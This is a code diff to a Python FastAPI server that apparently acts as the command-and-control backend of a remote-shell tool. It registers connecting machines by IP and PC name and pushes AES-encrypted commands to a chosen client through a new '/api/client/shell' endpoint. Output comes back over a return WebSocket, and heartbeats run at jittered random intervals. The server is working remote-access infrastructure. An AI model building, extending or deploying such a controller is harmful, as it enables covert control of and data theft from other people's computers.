@@ -1,10 +1,13 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request, Body
 from contextlib import asynccontextmanager
+from pydantic import BaseModel
 from tiny_aes import AES, pad, unpad
 from tiny_random import TinyRandom
+from datetime import datetime
 import asyncio
 import uvicorn
 import logging
+import json
 
 IV = b'\x00' * 16
 AES_KEY = [
@@ -41,39 +44,87 @@ async def lifespan(app: FastAPI):
 tyrdm = TinyRandom()
 tyaes = AES()
 client_info = {}
+client_counter = 1000  # 客户端ID计数器
 app = FastAPI(lifespan=lifespan)
 
-async def send_message(message):
+class SendMessageRequest(BaseModel):
+    client_id: int
+    type: str
+    data: str
+    path: str
+
+async def send_message(message, client_id):
     plaintext_bytes = message.encode('utf-8')
     padded = pad(plaintext_bytes)
     ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
-    for info in client_info.values():
-        websocket = info["websocket"]
+    if client_id in client_info:
+        websocket = client_info[client_id]["websocket"]
         await websocket.send_text(ciphertext.hex())
+    else:
+        logging.error(f"Client with ID {client_id} not found")
 
 async def heart_ping():
+    global client_counter
     while True:
-        for info in client_info.values():
+        for client_id, info in list(client_info.items()):
             websocket = info["websocket"]
-            await websocket.send_text("2d849b4ad9eab5de4b0d270eb5176b420bf6e6ab4048af81e0244224198c1cb5500cd3d5ff89db384dbb413006dccb86")
+            try:
+                await websocket.send_text("2f76b2aa378bbc56417c100659724fd9")
+            except Exception as e:
+                logging.error(f"Heartbeat failed for client {client_id}: {e}")
+                client_info.pop(client_id, None)
         await asyncio.sleep(tyrdm.random(300, 600))
 
-def get_mesgage(message_hex):
+def get_message(message_hex):
     ciphertext_bytes = bytes.fromhex(message_hex)
     decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
     unpadded = unpad(decrypted)
     return unpadded.decode('utf-8')
 
+async def handle_message(client_id, data):
+    try:
+        logging.info(data)
+        if client_id in client_info:
+            return_websocket = client_info[client_id].get("return_websocket")
+            if return_websocket:
+                await return_websocket.send_text(data)
+        return data
+    except Exception as e:
+        logging.error(f"Failed to decrypt message from client {client_id}: {e}")
+        return None
+
 @app.get("/api/server/client_list")
 async def client_list():
-    clients = [
-        {"ip": info["ip"], "from": info["from"], "pc_name": info["pc_name"]}
-        for info in client_info.values()
-    ]
-    return clients
+    clients_dict = {
+        info["pc_name"]: {
+            "client_id": client_id,
+            "ip": info["ip"],
+            "from": info["from"]
+        }
+        for client_id, info in client_info.items()
+    }
+    return clients_dict
+
+@app.post("/api/client/shell")
+async def send_shell(request: SendMessageRequest):
+    client_id = request.client_id
+    if client_id not in client_info:
+        logging.error(f"Client with ID {client_id} not found")
+        return {"status": "error", "message": "Client not found"}
+    timestamp = datetime.now().timestamp()
+    timestamp_ms = int(timestamp * 1000)  # 转换为毫秒
+    message = json.dumps({
+        "type": request.type,
+        "data": request.data,
+        "path": request.path,
+        "timestamp": timestamp_ms  # 添加时间戳
+    })
+    await send_message(message, client_id)
+    return {"status": "success", "message": "Message sent to client", "timestamp": timestamp_ms}
 
 @app.websocket("/api/server/shell")
 async def shell(websocket: WebSocket):
+    global client_counter
     required_headers = ["FRS", "FRSNode"]
     missing = [h for h in required_headers if h not in websocket.headers]
     if missing:
@@ -82,24 +133,44 @@ async def shell(websocket: WebSocket):
     ip = websocket.client.host if websocket.client else "unknown"
     frs = websocket.headers.get("FRS")
     frsnode = websocket.headers.get("FRSNode")
-    client_info[frsnode] = {
+    client_id = client_counter  # 生成唯一的客户端ID
+    client_counter += 1  # 增加计数器
+    client_info[client_id] = {
         "ip": ip,
         "from": frs,
         "pc_name": frsnode,
         "websocket": websocket,
     }
-    logging.info(f"WebSocket connection accepted from {frsnode}, headers: {dict(websocket.headers)}")
     try:
         while True:
             data = await websocket.receive_text()
-            logging.info(f"Received message from {frsnode}: {get_mesgage(data)}")
-            await websocket.send_text(f"Message received: {data}")
+            await handle_message(client_id, data)
     except WebSocketDisconnect:
-        logging.info(f"WebSocket disconnected from {frsnode}")
+        logging.info(f"WebSocket disconnected from client {client_id}")
     except Exception as e:
-        logging.error(f"Error processing WebSocket from {frsnode}: {e}")
+        logging.error(f"Error processing WebSocket from client {client_id}: {e}")
     finally:
-        client_info.pop(frsnode, None)
+        client_info.pop(client_id, None)
+
+@app.websocket("/api/client/return")
+async def return_shell(websocket: WebSocket):
+    if "clientId" not in websocket.headers:
+        raise HTTPException(status_code=403, detail="Missing clientId header")
+    client_id = int(websocket.headers["clientId"])
+    if client_id not in client_info:
+        raise HTTPException(status_code=404, detail="Client not found")
+    await websocket.accept()
+    client_info[client_id]["return_websocket"] = websocket
+    try:
+        while True:
+            data = await websocket.receive_text()
+            logging.info(f"Received return message from client {client_id}: {data}")
+    except WebSocketDisconnect:
+        logging.info(f"Return WebSocket disconnected from client {client_id}")
+    except Exception as e:
+        logging.error(f"Error processing return WebSocket from client {client_id}: {e}")
+    finally:
+        client_info[client_id].pop("return_websocket", None)
 
 if __name__ == "__main__":
     uvicorn.run(
